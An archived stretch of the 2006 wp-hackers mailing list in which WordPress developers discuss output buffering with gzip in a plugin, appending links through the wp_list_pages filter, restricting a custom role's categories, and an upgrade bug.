At 7:00 AM -0600 2/24/06, Andy Skelton wrote:

>To fix this, you have to understand that output buffers are FILO,
>meaning that if you start your buffer first, it will be the last one
>to be processed. Your buffer is started in the plugin. Examine
>wp-blog-header.php and you'll see that gzip_compression()'s buffer is
>started after all of wp-config has run--long after your plugin has
>started its buffer.

    That seems kind of silly.  Why would gzipping happen before all 
the other output buffers?  Why wouldn't it be the last thing done 
before the page is sent off?

>There's only one hook after gzip_compression, and it's template_redirect.
>Try this:
>
>add_action('template_redirect', 'ob_start', 'gatekeeper_comment_form_filter');

    Nope, didn't work with gzip enabled.  It worked just fine with 
gzip turned off, which is the usual experience.  Was I supposed to 
comment out the "ob_start('gatekeeper_comment_form_filter');" line, 
or no?  And should the first action I add, the one for _form_scan, be 
similarly hooked to template_redirect, or no?  I didn't see any 
difference in behavior either way, but maybe I missed the magic 
combination that would make it all work.

-- 
Eric A. Meyer  (eric@meyerweb.com)
Principal, Complex Spiral Consulting   http://complexspiral.com/
"CSS: The Definitive Guide," "CSS2.0 Programmer's Reference,"
"Eric Meyer on CSS," and more    http://meyerweb.com/eric/books/
From skeltoac at gmail.com  Tue Feb 28 03:21:48 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Tue Feb 28 03:24:00 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <a05210602c0296c6b243a@192.168.1.101>
References: <a05210600c0225ad80351@192.168.1.101>
	<e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
	<a05210602c0296c6b243a@192.168.1.101>
Message-ID: <e6ec604d0602271921q20a21d25k304aa190bfe6503b@mail.gmail.com>

On 2/27/06, Eric A. Meyer <eric@meyerweb.com> wrote:
> >add_action('template_redirect', 'ob_start', 'gatekeeper_comment_form_filter');

I'm sorry, I had the right idea here but the wrong add_action syntax.
Must have been out of my mind :-)

Remove all ob_start calls and do this:

add_action('template_redirect', 'register_gatekeeper_buffer');
function register_gatekeeper_buffer() {
 ob_start('gatekeeper_comment_form_filter');
}
From mark.wordpress at txfx.net  Tue Feb 28 04:02:36 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Tue Feb 28 04:04:57 2006
Subject: [wp-hackers] Need A Hook (or advice)
In-Reply-To: <4403654A.5040003@harnish.ca>
References: <4403654A.5040003@harnish.ca>
Message-ID: <9891F2C6-8E27-4EEC-AC2A-539B3E31F149@txfx.net>

On Feb 27, 2006, at 3:47 PM, Garett Harnish wrote:

> I need a way for a plugin to add a page to wp_list_pages.   I know  
> no hook exists to do this, and the only way I can think of  
> duplicating this functionality is ugly.

There's a wp_list_pages hook, but it operates on the text output of  
the entire function.  What I'd like eventually is to have  
wp_list_pages pass a hierarchial array through a different filter  
first, so you could use simple array manipulation to insert your  
stuff, instead of search/replace.

> I could have the plugin insert a page into the blog, but I just  
> need the page listed, I don't want it to be displayed like page.  I  
> want the contents to be PHP code from the plugin and I want the  
> page to remove itself if the plugin has been disabled (since it  
> won't work).

Does the page need to have a "nice" URI?  Or is it okay if the page  
points directly to your plugin?

In any case, you can use the wp_list_pages hook to do something like  
this:

> function add_garetts_link($text) {
> 	return $text . '<li class="page_item"><a href="' .  
> get_garetts_page_link() . '" title="Garett's Title">Link Text</a></ 
> li>';
> }
>
> add_filter('wp_list_pages', 'add_garetts_link', 50); // high number  
> so that other plugins get to have their way first

obviously you'd have to write get_garetts_page_link().

But anyway, that'll append your link to the end in the same style  
that wp_list_pages() adds page links.  It's a simplistic method, but  
it might do for your needs.  If you need the URI to look pretty, you  
have a lot more coding to do as you need to add a rewrite rule, and  
have the link generate the fancy version only if rewrite rules are  
being used, etc.

--
Mark Jaquith
http://txfx.net/


From r at robm.me.uk  Tue Feb 28 08:02:14 2006
From: r at robm.me.uk (Rob)
Date: Tue Feb 28 08:02:20 2006
Subject: [wp-hackers] Need A Hook (or advice)
In-Reply-To: <9891F2C6-8E27-4EEC-AC2A-539B3E31F149@txfx.net>
References: <4403654A.5040003@harnish.ca>
	<9891F2C6-8E27-4EEC-AC2A-539B3E31F149@txfx.net>
Message-ID: <44040386.1090306@robm.me.uk>

Mark Jaquith wrote:
> On Feb 27, 2006, at 3:47 PM, Garett Harnish wrote:
>
>> I need a way for a plugin to add a page to wp_list_pages.   I know no 
>> hook exists to do this, and the only way I can think of duplicating 
>> this functionality is ugly.
>
> There's a wp_list_pages hook, but it operates on the text output of 
> the entire function.  What I'd like eventually is to have 
> wp_list_pages pass a hierarchial array through a different filter 
> first, so you could use simple array manipulation to insert your 
> stuff, instead of search/replace.

This would make my life much, much easier with something I'm working on 
at the moment. I think I'll stop working on it until this is added :)

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From niels.hackius at gmail.com  Tue Feb 28 18:52:58 2006
From: niels.hackius at gmail.com (Niels Hackius)
Date: Tue Feb 28 18:55:10 2006
Subject: [wp-hackers] [question] [plugin] adding a role, restrict categories
Message-ID: <cd3f14da0602281052h7b7a2fdp@mail.gmail.com>

Dear WordPress-Hackers,
I have the following question:

I understand that, upon installing a plugin I can add a new role to
Wordpress' user system. Currently I am adding the role "developer" and also
assign a new capabilty to it: "filerelease".

Now I want the users of the type "developer" to be restricted in posting to
the category "Developers Corner" - how is this possible?

Any advise would be very helpful - thanks a lot.

Sincerly,
niels hackius
From ringmaster at midnightcircus.com  Tue Feb 28 19:36:53 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Tue Feb 28 19:37:26 2006
Subject: [wp-hackers] [question] [plugin] adding a role,
	restrict categories
In-Reply-To: <cd3f14da0602281052h7b7a2fdp@mail.gmail.com>
References: <cd3f14da0602281052h7b7a2fdp@mail.gmail.com>
Message-ID: <4404A655.1080609@midnightcircus.com>

Niels Hackius wrote:
> I understand that, upon installing a plugin I can add a new role to
> Wordpress' user system. Currently I am adding the role "developer" and also
> assign a new capabilty to it: "filerelease".
> 
> Now I want the users of the type "developer" to be restricted in posting to
> the category "Developers Corner" - how is this possible?

Are you trying to add this functionality to a plugin?  I've already 
written a plugin that does that:

http://redalt.com/wiki/Limit+Categories

If you're just looking for this plugin, then this is really a support 
question, and is more appropriate for the support forums than this 
mailing list.

Owen

From podz at tamba2.org.uk  Tue Feb 28 22:41:20 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb 28 22:43:39 2006
Subject: [wp-hackers] Moving sites
In-Reply-To: <4402371A.2090500@tamba2.org.uk>
References: <43FB78B8.6030203@tamba2.org.uk> <4402371A.2090500@tamba2.org.uk>
Message-ID: <4404D190.1020501@tamba2.org.uk>

Podz wrote:
>> http://wordpress.org/support/topic/61938?replies=8#post-330687
> 
> http://wordpress.org/support/topic/62694?replies=1
> 

Am I nagging yet ? :)

The issue:
Working blog, they upgrade to 2.0.1 and it says "You haven't installed yet".

Owen posted to the second link above and I think asked for a dump of the
options table.
That is here: http://www.joker619.com/output.htm
The environment is
My host: My own server
PHP version: 4.4.1
MySQL version: 4.0.16
Windows 2003 Server / IIS 6.0.
http://www.joker619.com/info.php

What else is needed to be known for this to be solved ?
It would appear to be a controllable environment and as this has
happened in other cases it seems to be a good chance.

I've done all I can though in flagging this up. Over to you.

P.
